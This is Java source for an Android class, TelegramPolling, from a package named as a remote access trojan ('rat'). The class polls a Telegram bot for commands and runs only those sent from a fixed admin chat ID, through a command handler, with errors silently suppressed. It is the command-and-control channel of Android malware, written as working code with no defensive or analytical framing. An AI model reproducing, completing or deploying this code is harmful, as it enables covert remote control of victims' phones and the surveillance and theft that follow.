package com.enterprise.rat.services;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.commands.CommandHandler;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import java.util.concurrent.TimeUnit;

public class TelegramPolling implements Runnable {
    private Context context;
    private volatile boolean running = true;
    private long lastUpdateId = 0;
    private OkHttpClient client;
    private Handler mainHandler;
    private CommandHandler commandHandler;

    public TelegramPolling(Context context) {
        this.context = context;
        this.mainHandler = new Handler(Looper.getMainLooper());
        this.commandHandler = new CommandHandler(context);
        this.client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build();
    }

    public boolean isRunning() { return running; }
    public void stop() { running = false; }

    @Override
    public void run() {
        while (running) {
            try {
                String url = BotConfig.API_BASE_URL + "getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=30&limit=10";
                Request request = new Request.Builder().url(url).get().build();
                Response response = client.newCall(request).execute();

                if (response.isSuccessful() && response.body() != null) {
                    String responseBody = response.body().string();
                    JsonObject jsonResponse = JsonParser.parseString(responseBody).getAsJsonObject();

                    if (jsonResponse.get("ok").getAsBoolean()) {
                        JsonArray updates = jsonResponse.getAsJsonArray("result");
                        for (JsonElement element : updates) {
                            JsonObject update = element.getAsJsonObject();
                            lastUpdateId = update.get("update_id").getAsLong();
                            processUpdate(update);
                        }
                    }
                }
                if (response.body() != null) response.close();
            } catch (Exception e) {
                try { Thread.sleep(BotConfig.POLLING_INTERVAL_MS); }
                catch (InterruptedException ie) { Thread.currentThread().interrupt(); break; }
            }
            try { Thread.sleep(200); }
            catch (InterruptedException e) { Thread.currentThread().interrupt(); break; }
        }
    }

    private void processUpdate(JsonObject update) {
        try {
            JsonObject message = null;
            String text = "";
            long chatId = 0;
            String messageId = "";

            if (update.has("message")) message = update.getAsJsonObject("message");
            else if (update.has("edited_message")) message = update.getAsJsonObject("edited_message");
            else if (update.has("callback_query")) {
                JsonObject callback = update.getAsJsonObject("callback_query");
                message = callback.getAsJsonObject("message");
                text = callback.get("data").getAsString();
                chatId = callback.has("message") ? callback.getAsJsonObject("message").getAsJsonObject("chat").get("id").getAsLong() : 0;
                messageId = callback.get("id").getAsString();
                if (message != null && chatId == BotConfig.ADMIN_CHAT_ID) {
                    commandHandler.handleCommand(text, chatId, messageId, message);
                }
                return;
            }

            if (message != null) {
                chatId = message.getAsJsonObject("chat").get("id").getAsLong();
                messageId = message.get("message_id").getAsString();
                if (message.has("text")) text = message.get("text").getAsString();
                else if (message.has("caption")) text = message.get("caption").getAsString();

                if (chatId == BotConfig.ADMIN_CHAT_ID && !text.isEmpty()) {
                    String finalText = text;
                    long finalChatId = chatId;
                    String finalMessageId = messageId;
                    JsonObject finalMessage = message;
                    mainHandler.post(() -> commandHandler.handleCommand(finalText, finalChatId, finalMessageId, finalMessage));
                }
            }
        } catch (Exception e) {}
    }
}
